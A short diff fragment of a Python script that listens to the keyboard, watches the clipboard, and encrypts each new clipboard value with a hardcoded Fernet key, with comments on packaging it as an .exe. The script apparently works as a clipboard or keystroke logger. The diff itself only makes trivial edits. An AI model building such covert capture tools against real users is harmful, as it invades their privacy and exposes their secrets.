@@ -11,7 +11,7 @@ from pynput import keyboard
 import pyautogui as pya
 
 from cryptography.fernet import Fernet
-import json
+# import json
 
 # https://www.geeksforgeeks.org/convert-python-script-to-exe-file/
 # pip install pyinstaller
@@ -148,7 +148,7 @@ while True:
         if clipboard != clipboard_before and clipboard != "":
 
             # https://stackoverflow.com/questions/20706783/put-byte-array-to-json-and-vice-versa
-            token = encrypt(clipboard.encode(), 'cNkXmbsNUoAyyLx9bR8HMcj_5JaDNq42Bz_YDXcf3t4='.encode()).decode('utf-8')
+            token = encrypt(clipboard.encode(), 'cNkXmbsNUoAyyLx9bR8HMcj_5JaDNq42Bz_YDXcf3t4='.encode()).decode()
             print('token: ' + token)
 
             # print('clipboard: content changed')
